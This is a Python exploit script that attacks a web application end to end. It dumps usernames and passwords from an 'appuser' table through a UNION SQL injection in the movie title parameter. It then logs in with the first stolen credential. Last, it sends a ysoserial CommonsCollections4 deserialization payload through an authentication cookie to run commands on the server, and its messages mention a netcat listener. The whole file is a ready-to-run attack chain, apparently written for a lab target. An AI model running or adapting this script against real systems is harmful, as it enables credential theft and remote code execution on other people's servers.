import requests, os, argparse, json, base64, time

http_proxy = {'http':'http://127.0.0.1:6060','https':'http://127.0.0.1:6060'}

session = requests.Session()

def dump_data(target):
    print("[i] Dump database ...")
    payload = "' union select null,name,password,id from appuser-- -"
    url = f"http://{target}/rest/movie?title={payload}"
    r = requests.get(url, proxies=http_proxy)
    j = json.loads(r.text)

    credentials = []

    for record in j:
        if (len(record["title"]) < 20):
            credentials.append(record["title"] + ":" + record["genre"])
    
    print("[+] Dump DB Success!")
    pertamax = credentials[0]
    username, password = pertamax.split(':')
    return username,password


def login(target, un, pw):
    url = f"http://{target}/login"
    b_data = f"username={un}&password={pw}"
    headers = {"Content-Type":"application/x-www-form-urlencoded"}
    r = session.post(url, data=b_data, headers=headers)
    if un in r.text:
        print("[+] Login success")

def generate_ysoserial(current_os):
    print("[i] Generating Payload from ysoserial")

    ## If your java version not supported add this {additional} to your cmd variable
    additional = "--add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED --add-opens java.base/java.net=ALL-UNNAMED --add-opens=java.base/java.util=ALL-UNNAMED"

    ## Like this
    # cmd = f'java {additional} -jar ysoserial.jar CommonsCollections4 "touch /tmp/apwnd.txt" > deserial.bin'

    if current_os.lower() == 'lin':
        print("===Linux===")
        cmd = f'java -jar ysoserial.jar CommonsCollections4 "touch /tmp/apwnd.txt" | base64 -w0'
        out = os.popen(cmd)
        return out.read()
    elif current_os.lower() == 'win':
        print("===Windows===")
        cmd = f'java {additional} -jar ysoserial.jar CommonsCollections4 "touch /tmp/apwnd.txt" > deserial.bin'
        os.popen(cmd)
        time.sleep(1) # wait 1sec to ensure the file has been created
        print("[+] Payload Generated and stored to deserial.bin")
        return None

def rce(target, cookie):
    url = f"http://{target}/rest/movie"
    print("[i] Injecting malicious serialization to cookie 'USER_AUTHENTICATION_EXTRA_SECURITY'")
    if cookie != None:
        session.cookies.set('USER_AUTHENTICATION_EXTRA_SECURITY', cookie)
        session.get(url)
        print("[+] Done check your nc")
    else:
        with open('deserial.bin', 'rb') as file:
            deserialized_data = file.read()
        enc_serial = base64.b64encode(deserialized_data).decode()
        session.cookies.set('USER_AUTHENTICATION_EXTRA_SECURITY', enc_serial)
        session.get(url, proxies=http_proxy)
        print("[+] Done check your nc")

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--target', '-t', dest='target', help='Target Machine', required=True)
    parser.add_argument('--current-os', '-co', dest='curr_os', help='Current OS for running this exploit', choices=['lin', 'win'], required=True)
    args = parser.parse_args()

    target = args.target
    curr_os = args.curr_os

    username, password = dump_data(target)
    login(target,username,password)
    cookie = generate_ysoserial(curr_os)
    rce(target, cookie)

if __name__ == "__main__":
    main()